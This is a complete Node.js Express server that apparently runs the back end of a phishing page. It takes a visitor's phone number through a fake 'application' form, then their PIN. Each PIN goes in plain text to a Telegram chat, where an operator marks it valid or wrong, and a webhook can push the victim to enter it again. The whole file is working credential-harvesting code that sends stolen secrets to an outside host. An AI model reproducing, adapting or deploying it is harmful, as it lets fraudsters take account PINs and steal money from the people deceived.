const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const users = {};

// Telegram API base
const tgURL = `https://api.telegram.org/bot${botToken}`;

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// 1. INITIAL APPLICATION
app.post("/apply", async (req, res) => {
  const phone = req.body.phone;
  if (!phone) return res.sendStatus(400);

  users[phone] = {
    status: "pending",
    pinStatus: "waiting",
    attempts: 0
  };

  // INLINE KEYBOARD (FIXED)
  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Approve", callback_data: `ok_${phone}` },
        { text: "❌ Reject", callback_data: `reject_${phone}` }
      ]
    ]
  };

  try {
    await axios.post(`${tgURL}/sendMessage`, {
      chat_id: chatId,
      text: `📥 New Application:\nPhone: ${phone}`,
      reply_markup: keyboard
    });
  } catch (e) {
    console.log("TG Error: Application message failed", e.message);
  }

  res.sendStatus(200);
});

// 2. STATUS CHECKS
app.get("/status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({ status: u ? u.status : "unknown" });
});

app.get("/check-pin-status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({
    status: u ? u.pinStatus : "unknown",
    attempt: u ? u.attempts : 0
  });
});

// 3. PIN SUBMISSION
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;
  if (!users[phone]) return res.sendStatus(404);

  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying";

  // INLINE KEYBOARD (FIXED)
  const keyboard = {
    inline_keyboard: [
      [
        { text: "✔ PIN OK", callback_data: `pinok_${phone}` },
        { text: "❌ Wrong PIN", callback_data: `pinerr_${phone}` }
      ]
    ]
  };

  try {
    await axios.post(`${tgURL}/sendMessage`, {
      chat_id: chatId,
      text: `🔐 PIN Received:\nPhone: ${phone}\nPIN: ${pin}`,
      reply_markup: keyboard
    });
  } catch (e) {
    console.log("TG Error: PIN message failed", e.message);
  }

  res.sendStatus(200);
});

// 4. WEBHOOK
app.post("/webhook", (req, res) => {
  const body = req.body;
  if (!body.callback_query) return res.sendStatus(200);

  const data = body.callback_query.data;
  const parts = data.split("_");

  const cmd = parts[0];
  const phone = parts[1];

  if (users[phone]) {
    if (cmd === "ok") users[phone].status = "approved";
    if (cmd === "reject") users[phone].status = "rejected";
    if (cmd === "pinok") users[phone].pinStatus = "success";
    if (cmd === "pinerr") users[phone].pinStatus = "re-enter";
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("SERVER IS LIVE AND READY");
});
